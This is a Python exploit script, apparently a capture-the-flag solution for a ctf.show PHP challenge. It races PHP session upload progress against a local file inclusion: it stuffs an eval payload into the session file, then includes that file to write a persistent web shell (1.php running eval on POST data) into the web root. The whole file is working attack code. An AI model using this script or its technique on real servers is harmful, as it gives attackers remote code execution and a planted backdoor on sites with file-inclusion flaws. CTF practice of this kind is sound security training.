# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2021-03-29 00:05:47
# @Last Modified by:   h1xa
# @Last Modified time: 2021-03-29 00:39:26
# @email: h1xa@ctfer.com
# @link: https://ctfer.com


import requests
import io
import threading

url='http://b5fbad79-fc27-4e09-b7a6-906d93b2c4b2.challenge.ctf.show:8080/'
sessionid='ctfshow'
data={
	"1":"file_put_contents('/var/www/html/1.php','<?php eval($_POST[2]);?>');"
}

def write(session):
	fileBytes = io.BytesIO(b'a'*1024*50)
	while True:
		response=session.post(url,
			data={
			'PHP_SESSION_UPLOAD_PROGRESS':'<?php eval($_POST[1]);?>'
			},
			cookies={
			'PHPSESSID':sessionid
			},
			files={
			'file':('ctfshow.jpg',fileBytes)
			}
			)

def read(session):
	while True:
		response=session.post(url+'?file=/tmp/sess_'+sessionid,data=data,
			cookies={
			'PHPSESSID':sessionid
			}
			)
		resposne2=session.get(url+'1.php');
		if resposne2.status_code==200:
			print('++++++done++++++')
		else:
			print(resposne2.status_code)

if __name__ == '__main__':

	evnet=threading.Event()
	with requests.session() as session:
		for i in range(5):
			threading.Thread(target=write,args=(session,)).start()
		for i in range(5):
			threading.Thread(target=read,args=(session,)).start()

	evnet.set()
